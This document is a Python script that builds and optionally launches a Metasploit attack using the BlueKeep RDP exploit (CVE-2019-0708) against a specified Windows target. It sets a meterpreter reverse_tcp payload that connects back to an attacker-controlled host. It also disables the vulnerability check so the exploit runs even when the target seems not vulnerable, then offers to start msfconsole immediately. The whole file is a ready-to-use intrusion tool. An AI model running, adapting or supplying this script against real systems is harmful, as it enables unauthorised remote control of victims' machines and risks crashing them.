#!/usr/bin/env python3

import os
import sys
import subprocess
import argparse
import random

def create_force_script(target_ip, lhost, target_id=0, rport=3389, lport=4444):
    """Create a Metasploit resource script that forces the BlueKeep exploit."""
    script_name = f"bluekeep_force_{random.randint(1000, 9999)}.rc"
    
    with open(script_name, "w") as f:
        f.write("use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n")
        f.write(f"set RHOSTS {target_ip}\n")
        f.write(f"set RPORT {rport}\n")
        f.write(f"set TARGET {target_id}\n")
        f.write("set PAYLOAD windows/x64/meterpreter/reverse_tcp\n")
        f.write(f"set LHOST {lhost}\n")
        f.write(f"set LPORT {lport}\n")
        f.write("set ForceExploit true\n")
        f.write("set AutoCheck false\n")
        f.write("exploit\n")
    
    print(f"[+] Created forced exploit script: {script_name}")
    return script_name

def main():
    banner = """
    ____  __           __ __                 ______                      
   / __ )/ /_  _____  / //_/__  ___ ____    / __/ /___ _______  ___ 
  / __  / / / / / _ \/ ,< / _ \/ -_) __/   / _// __/ // / __/ / / /
 / /_/ / /___/ /  __/ /| /  __/\__/_/     /_/ /\__/\_,_/_/ /_/_/_/ 
/_____/_____/_/\___/_/ |_\___/                                      
                                                                    
 CVE-2019-0708 BlueKeep Forced Exploit
 Target: Windows 2003/XP/Vista/7/Server 2008
 """
    
    print(banner)
    
    parser = argparse.ArgumentParser(description="Force BlueKeep exploit regardless of vulnerability check")
    parser.add_argument("-i", "--rhost", required=True, help="Target IP address")
    parser.add_argument("-l", "--lhost", required=True, help="Local host for reverse connection")
    parser.add_argument("-t", "--target", type=int, choices=range(0, 6), default=0, 
                      help="Target ID (0: auto, 1: Win7 SP1, 2: Win7 SP0, 3: Win2008 R2 SP1, 4: Win2008 R2 SP0, 5: Win2008 SP1)")
    parser.add_argument("-p", "--rport", type=int, default=3389, help="Target RDP port (default: 3389)")
    parser.add_argument("-o", "--lport", type=int, default=4444, help="Local port for handler (default: 4444)")
    args = parser.parse_args()
    
    print("[*] Creating forced exploit script...")
    print("[*] Target IP: " + args.rhost)
    print("[*] Local IP: " + args.lhost)
    print("[*] CAUTION: Forcing exploit to run even if target appears invulnerable")
    print()
    
    script_name = create_force_script(args.rhost, args.lhost, args.target, args.rport, args.lport)
    
    print("\nTo run the exploit, execute:")
    print(f"msfconsole -r {script_name}")
    
    choice = input("\nRun exploit now? (y/n): ")
    if choice.lower() == 'y':
        print("\n[*] Launching Metasploit Framework...")
        subprocess.run(["msfconsole", "-r", script_name])
    else:
        print(f"\n[*] Script created: {script_name}")
        print("[*] You can run it later with the command above")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Operation cancelled by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] An error occurred: {str(e)}")
        sys.exit(1)
